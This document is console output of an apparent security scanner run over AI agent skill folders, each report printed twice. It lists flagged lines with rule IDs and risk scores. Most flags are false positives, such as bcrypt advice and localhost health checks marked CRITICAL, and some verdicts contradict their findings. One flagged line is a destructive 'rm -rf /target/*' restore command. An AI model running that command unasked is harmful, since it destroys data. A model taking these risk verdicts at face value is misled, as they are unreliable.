
[!] CRITICAL Issues (21):
  [FILE001] in req-to-test/SKILL.md:84
    Pattern: And I enter password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:93
    Pattern: And I enter password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:131
    Pattern: - password = "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:132
    Pattern: Execute: user = create_user(email, password)
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:135
    Pattern: - user.password is hashed
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:156
    Pattern: 3. Verify response contains user ID and token
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:162
    Pattern: - Response body contains: {id: <uuid>, token: <jwt>}
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:164
    Pattern: - User password is hashed (not plain text)
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:166
    Pattern: - Confirmation link in email contains valid token
    Confidence: MEDIUM
  [FILE001] in req-to-test/SKILL.md:189
    Pattern: And user enters password "SecurePass123"
    Confidence: MEDIUM
  and 11 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 21
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 21

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/req-to-test.json
Scanning: requirement-comparison-reporter

[*] Scanning Skill: requirement-comparison-reporter

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in requirement-comparison-reporter/SKILL.md:135
    Pattern: - `user.py::User` - Add 2FA token field
    Confidence: MEDIUM
  [FILE001] in requirement-comparison-reporter/SKILL.md:235
    Pattern: - `test_auth.py::test_2fa_token_validation()` - New test
    Confidence: MEDIUM
  [FILE001] in requirement-comparison-reporter/references/analysis-patterns.md:154
    Pattern: → Functions: login(), logout(), validate_token()
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-comparison-reporter.html
Scanning: requirement-comparison-reporter

[*] Scanning Skill: requirement-comparison-reporter

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in requirement-comparison-reporter/SKILL.md:135
    Pattern: - `user.py::User` - Add 2FA token field
    Confidence: MEDIUM
  [FILE001] in requirement-comparison-reporter/SKILL.md:235
    Pattern: - `test_auth.py::test_2fa_token_validation()` - New test
    Confidence: MEDIUM
  [FILE001] in requirement-comparison-reporter/references/analysis-patterns.md:154
    Pattern: → Functions: login(), logout(), validate_token()
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-comparison-reporter.json
Scanning: requirement-coverage-checker

[*] Scanning Skill: requirement-coverage-checker

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-coverage-checker.html
Scanning: requirement-coverage-checker

[*] Scanning Skill: requirement-coverage-checker

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-coverage-checker.json
Scanning: requirement-enhancer

[*] Scanning Skill: requirement-enhancer

[!] Risk Level: CRITICAL (8.6/10)

[!] CRITICAL Issues (19):
  [FILE001] in requirement-enhancer/SKILL.md:75
    Pattern: **For authentication**: Password requirements, session management, rate limiting
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:16
    Pattern: - No password requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:20
    Pattern: 1. What authentication methods should be supported? (username/password, OAuth...
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:21
    Pattern: 2. What are the password requirements?
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:28
    Pattern: 1. Username/password initially, OAuth (Google, GitHub) in future
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:44
    Pattern: - **Description**: Users MUST be able to authenticate using username and pass...
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:47
    Pattern: - When they enter username and password and click "Log In"
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:69
    Pattern: **FR-AUTH-004**: Password Requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:71
    Pattern: - **Description**: Passwords MUST meet minimum security requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:75
    Pattern: - MUST NOT be a common password (check against top 10,000 list)
    Confidence: MEDIUM
  and 9 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 19
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 19

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/requirement-enhancer.html
Scanning: requirement-enhancer

[*] Scanning Skill: requirement-enhancer

[!] Risk Level: CRITICAL (8.6/10)

[!] CRITICAL Issues (19):
  [FILE001] in requirement-enhancer/SKILL.md:75
    Pattern: **For authentication**: Password requirements, session management, rate limiting
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:16
    Pattern: - No password requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:20
    Pattern: 1. What authentication methods should be supported? (username/password, OAuth...
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:21
    Pattern: 2. What are the password requirements?
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:28
    Pattern: 1. Username/password initially, OAuth (Google, GitHub) in future
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:44
    Pattern: - **Description**: Users MUST be able to authenticate using username and pass...
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:47
    Pattern: - When they enter username and password and click "Log In"
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:69
    Pattern: **FR-AUTH-004**: Password Requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:71
    Pattern: - **Description**: Passwords MUST meet minimum security requirements
    Confidence: MEDIUM
  [FILE001] in requirement-enhancer/references/examples.md:75
    Pattern: - MUST NOT be a common password (check against top 10,000 list)
    Confidence: MEDIUM
  and 9 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 19
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 19

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/requirement-enhancer.json
Scanning: requirement-summarizer

[*] Scanning Skill: requirement-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-summarizer.html
Scanning: requirement-summarizer

[*] Scanning Skill: requirement-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-summarizer.json
Scanning: requirement-summary

[*] Scanning Skill: requirement-summary

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in requirement-summary/SKILL.md:72
    Pattern: **Core Functionality**: Implement OAuth 2.0 authentication with support for G...
    Confidence: MEDIUM
  [FILE001] in requirement-summary/SKILL.md:80
    Pattern: **Security Requirements**: Enforce HTTPS-only, implement CSRF protection, sto...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-summary.html
Scanning: requirement-summary

[*] Scanning Skill: requirement-summary

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in requirement-summary/SKILL.md:72
    Pattern: **Core Functionality**: Implement OAuth 2.0 authentication with support for G...
    Confidence: MEDIUM
  [FILE001] in requirement-summary/SKILL.md:80
    Pattern: **Security Requirements**: Enforce HTTPS-only, implement CSRF protection, sto...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/requirement-summary.json
Scanning: rollback-strategy-advisor

[*] Scanning Skill: rollback-strategy-advisor

[?] Risk Level: MEDIUM (4.5/10)

[!] CRITICAL Issues (12):
  [NET001] in rollback-strategy-advisor/SKILL.md:42
    Pattern: curl http://localhost:8080/health  # Health endpoint
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:115
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:160
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:304
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:331
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:332
    Pattern: curl -I http://localhost:8080  # HTTP status code
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:349
    Pattern: curl -X POST http://localhost:8080/api/login -d '{"user":"test","pass":"test"}'
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:350
    Pattern: curl http://localhost:8080/api/users/1
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/references/platform_guides.md:62
    Pattern: curl http://localhost:8081/health
    Confidence: MEDIUM
  [FILE002] in rollback-strategy-advisor/references/platform_guides.md:270
    Pattern: sh -c "rm -rf /target/* && tar xzf /backup/myapp-data-20260215_120000.tar.gz ...
    Confidence: HIGH
  and 2 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 12
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 12

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/rollback-strategy-advisor.html
Scanning: rollback-strategy-advisor

[*] Scanning Skill: rollback-strategy-advisor

[?] Risk Level: MEDIUM (4.5/10)

[!] CRITICAL Issues (12):
  [NET001] in rollback-strategy-advisor/SKILL.md:42
    Pattern: curl http://localhost:8080/health  # Health endpoint
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:115
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:160
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:304
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:331
    Pattern: curl http://localhost:8080/health
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:332
    Pattern: curl -I http://localhost:8080  # HTTP status code
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:349
    Pattern: curl -X POST http://localhost:8080/api/login -d '{"user":"test","pass":"test"}'
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/SKILL.md:350
    Pattern: curl http://localhost:8080/api/users/1
    Confidence: MEDIUM
  [NET001] in rollback-strategy-advisor/references/platform_guides.md:62
    Pattern: curl http://localhost:8081/health
    Confidence: MEDIUM
  [FILE002] in rollback-strategy-advisor/references/platform_guides.md:270
    Pattern: sh -c "rm -rf /target/* && tar xzf /backup/myapp-data-20260215_120000.tar.gz ...
    Confidence: HIGH
  and 2 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 12
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 12

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/rollback-strategy-advisor.json
Scanning: runtime-error-explainer

[*] Scanning Skill: runtime-error-explainer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/runtime-error-explainer.html
Scanning: runtime-error-explainer

[*] Scanning Skill: runtime-error-explainer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/runtime-error-explainer.json
Scanning: scenario-generator

[*] Scanning Skill: scenario-generator

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (47):
  [FILE001] in scenario-generator/SKILL.md:67
    Pattern: Users should be able to log in with email and password.
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:69
    Pattern: Password must be at least 8 characters.
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:74
    Pattern: - **Inputs**: Email, password
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:77
    Pattern: - **Edge cases**: Invalid email, wrong password, locked account, expired session
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:89
    Pattern: | Boundary | Min/max values | Minimum password length, maximum cart items |
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:90
    Pattern: | Error Handling | Invalid inputs | Wrong password, network error |
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:100
    Pattern: - Boundary: Exactly 8 characters password
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:101
    Pattern: - Error: Wrong password (attempt 1, 2, 3)
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:129
    Pattern: And the user enters password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:135
    Pattern: Scenario: Failed login with incorrect password
    Confidence: MEDIUM
  and 37 more

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 47
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 47

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/scenario-generator.html
Scanning: scenario-generator

[*] Scanning Skill: scenario-generator

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (47):
  [FILE001] in scenario-generator/SKILL.md:67
    Pattern: Users should be able to log in with email and password.
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:69
    Pattern: Password must be at least 8 characters.
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:74
    Pattern: - **Inputs**: Email, password
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:77
    Pattern: - **Edge cases**: Invalid email, wrong password, locked account, expired session
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:89
    Pattern: | Boundary | Min/max values | Minimum password length, maximum cart items |
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:90
    Pattern: | Error Handling | Invalid inputs | Wrong password, network error |
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:100
    Pattern: - Boundary: Exactly 8 characters password
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:101
    Pattern: - Error: Wrong password (attempt 1, 2, 3)
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:129
    Pattern: And the user enters password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in scenario-generator/SKILL.md:135
    Pattern: Scenario: Failed login with incorrect password
    Confidence: MEDIUM
  and 37 more

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 47
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 47

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/scenario-generator.json
Scanning: security-patch-advisor

[*] Scanning Skill: security-patch-advisor

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (44):
  [FILE001] in security-patch-advisor/SKILL.md:206
    Pattern: - Hash passwords with bcrypt/Argon2
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:189
    Pattern: - Use TOTP or hardware tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:192
    Pattern: 2. **Strong Password Policies**
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:195
    Pattern: - Password strength meters
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:212
    Pattern: - Password policies: Improved security, user annoyance
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:258
    Pattern: - Use Argon2, bcrypt, or scrypt for passwords
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:293
    Pattern: - Don't use `Math.random()` for tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:297
    Pattern: - Use at least 128 bits for session tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:303
    Pattern: - Entropy requirements: Better security, larger tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:380
    Pattern: - Regular password changes
    Confidence: MEDIUM
  and 34 more

[*] WARNING Issues (9):
  [CMD002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [INJ002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [INJ002] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [OBF001] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [OBF001] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [OBF002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [OBF002] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [CMD002] in security-patch-advisor/references/examples.md:60
    Pattern: os.system(cmd)
    Confidence: MEDIUM
  [CMD002] in security-patch-advisor/references/examples.md:89
    Pattern: - Replaced `os.system()` with `subprocess.run()`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 44
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 53

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/security-patch-advisor.html
Scanning: security-patch-advisor

[*] Scanning Skill: security-patch-advisor

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (44):
  [FILE001] in security-patch-advisor/SKILL.md:206
    Pattern: - Hash passwords with bcrypt/Argon2
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:189
    Pattern: - Use TOTP or hardware tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:192
    Pattern: 2. **Strong Password Policies**
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:195
    Pattern: - Password strength meters
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:212
    Pattern: - Password policies: Improved security, user annoyance
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:258
    Pattern: - Use Argon2, bcrypt, or scrypt for passwords
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:293
    Pattern: - Don't use `Math.random()` for tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:297
    Pattern: - Use at least 128 bits for session tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:303
    Pattern: - Entropy requirements: Better security, larger tokens
    Confidence: MEDIUM
  [FILE001] in security-patch-advisor/references/remediation_strategies.md:380
    Pattern: - Regular password changes
    Confidence: MEDIUM
  and 34 more

[*] WARNING Issues (9):
  [CMD002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [INJ002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [INJ002] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [OBF001] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [OBF001] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [OBF002] in security-patch-advisor/references/remediation_strategies.md:87
    Pattern: - `system()`, `exec()`, `popen()` with user input
    Confidence: MEDIUM
  [OBF002] in security-patch-advisor/references/remediation_strategies.md:152
    Pattern: - Using `pickle`, `marshal`, `eval()` on untrusted input
    Confidence: MEDIUM
  [CMD002] in security-patch-advisor/references/examples.md:60
    Pattern: os.system(cmd)
    Confidence: MEDIUM
  [CMD002] in security-patch-advisor/references/examples.md:89
    Pattern: - Replaced `os.system()` with `subprocess.run()`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 44
  Warning Issues: 9
  Info Issues: 0
  Total Issues: 53

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/security-patch-advisor.json
Scanning: security-sensitive-path-instrumenter

[*] Scanning Skill: security-sensitive-path-instrumenter

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (24):
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:16
    Pattern: 3. **Review best practices** - Check [best_practices.md](references/best_prac...
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:35
    Pattern: - No sensitive data (passwords, tokens, secrets) is logged
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:44
    Pattern: - **Authentication**: Login attempts, logout, password changes, MFA, token va...
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:98
    Pattern: - Passwords (plaintext or hashed)
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:100
    Pattern: - Full session tokens
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:42
    Pattern: password = request.json.get('password')
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:53
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:62
    Pattern: return {'token': generate_token(user)}
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:163
    Pattern: const { username, password } = req.body;
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:175
    Pattern: const user = await authenticateUser(username, password);
    Confidence: MEDIUM
  and 14 more

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 24
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 24

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/security-sensitive-path-instrumenter.html
Scanning: security-sensitive-path-instrumenter

[*] Scanning Skill: security-sensitive-path-instrumenter

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (24):
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:16
    Pattern: 3. **Review best practices** - Check [best_practices.md](references/best_prac...
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:35
    Pattern: - No sensitive data (passwords, tokens, secrets) is logged
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:44
    Pattern: - **Authentication**: Login attempts, logout, password changes, MFA, token va...
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:98
    Pattern: - Passwords (plaintext or hashed)
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/SKILL.md:100
    Pattern: - Full session tokens
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:42
    Pattern: password = request.json.get('password')
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:53
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:62
    Pattern: return {'token': generate_token(user)}
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:163
    Pattern: const { username, password } = req.body;
    Confidence: MEDIUM
  [FILE001] in security-sensitive-path-instrumenter/references/language_patterns.md:175
    Pattern: const user = await authenticateUser(username, password);
    Confidence: MEDIUM
  and 14 more

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 24
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 24

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/security-sensitive-path-instrumenter.json
Scanning: semantic-bug-detector

[*] Scanning Skill: semantic-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-bug-detector.html
Scanning: semantic-bug-detector

[*] Scanning Skill: semantic-bug-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-bug-detector.json
Scanning: semantic-equivalence-verifier

[*] Scanning Skill: semantic-equivalence-verifier

[OK] Risk Level: SAFE (1.6/10)

[!] CRITICAL Issues (3):
  [NET001] in semantic-equivalence-verifier/references/language_patterns.md:279
    Pattern: return fetch(url).then(r => r.json());
    Confidence: MEDIUM
  [NET001] in semantic-equivalence-verifier/references/language_patterns.md:284
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [INJ001] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM
  [OBF001] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM
  [OBF002] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 3
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-equivalence-verifier.html
Scanning: semantic-equivalence-verifier

[*] Scanning Skill: semantic-equivalence-verifier

[OK] Risk Level: SAFE (1.6/10)

[!] CRITICAL Issues (3):
  [NET001] in semantic-equivalence-verifier/references/language_patterns.md:279
    Pattern: return fetch(url).then(r => r.json());
    Confidence: MEDIUM
  [NET001] in semantic-equivalence-verifier/references/language_patterns.md:284
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [INJ001] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM
  [OBF001] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM
  [OBF002] in semantic-equivalence-verifier/references/symbolic_execution.md:170
    Pattern: print("Found difference:", state_a.solver.eval(x))
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 3
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/semantic-equivalence-verifier.json
Scanning: semantic-szz-analyzer

[*] Scanning Skill: semantic-szz-analyzer

[OK] Risk Level: SAFE (1.2/10)

[!] CRITICAL Issues (1):
  [INJ001] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM

[*] WARNING Issues (5):
  [CMD002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
  [INJ002] in semantic-szz-analyzer/references/language_support.md:301
    Pattern: - `eval()` and `exec()`: Cannot be fully analyzed statically
    Confidence: MEDIUM
